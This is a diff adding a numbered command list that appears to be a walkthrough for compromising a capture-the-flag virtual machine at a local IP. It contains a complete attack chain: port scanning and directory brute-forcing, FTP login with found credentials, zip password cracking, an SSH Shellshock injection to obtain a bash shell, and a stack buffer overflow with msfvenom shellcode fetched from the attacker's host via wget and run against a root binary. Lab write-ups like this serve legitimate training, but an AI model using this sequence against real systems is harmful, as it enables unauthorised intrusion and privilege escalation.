@@ -1,0 +1,66 @@
+#1 - Find Ip address
+arp-scan --localnet
+
+#2 - Scan open ports and service versions
+nmap -sV -A -p- 192.168.1.128
+
+#3 - Directory Enumeration
+gobuster dir -url http://192.168.1.128/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+
+#4 - Curl the findings of the page
+curl -s "http://192.168.1.128/robots"
+
+#5 - Directory Enumeration based on previous findings
+gobuster dir -url http://192.168.1.128/ -w 4.robots.txt
+
+#6 - MD5 sum on all images to check differences
+md5sum *.jpg
+
+#7 - Strings on the unique hash
+strings dont_bother.jpg
+
+#8 - Curl the answer file
+curl -s "http://192.168.1.128/y0ur_self/answer.txt" | tee answer.txt
+
+#9 - Curl index page for clues
+curl -s "http://192.168.1.128/"
+
+#10 - Ftp with credentials User:Tr0ll Pass:T[REDACTED]
+ftp 192.168.1.128
+
+#11 - Trying to unzip the file obtained with ftp
+unzip lmao.zip
+
+#12 - Hash zip file for bruteforcing attempts
+zip2john lmao.zip > 10.lmao.hash
+
+#13 - Decode from base64 answer file
+base64 -d 8.answer.txt > 9.answer_decoded.txt
+
+#14 - Bruteforce answers passwords on the file hash
+john -wordlist:9.answer_decoded.txt 11.lmao.hash
+
+#15 - ssh login with rsa key
+ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i noob noob@192.168.1.128
+
+#16 - ssh login with shellshock
+ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i noob -t noob@192.168.1.128 "() { :;}; /bin/bash"
+
+#17 - Create string to find EIP offset
+msf-pattern_create -l 300
+
+#18 - Find offset
+msf-pattern_offset -q 0x6a413969 
+
+#19 - Create payload to find correct ret addr
+python -c 'print "A"*268 + "B"*4 + "\x90"*150' > /tmp/payload
+
+#20 - Bin bash hex string
+msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
+
+#21 - Bring exploit into target
+wget http://192.168.1.124:12345/binary_exploitation.py -O /tmp/exploit.py
+
+#22 - Run exploit
+./r00t $(python /tmp/exploit.py)
+
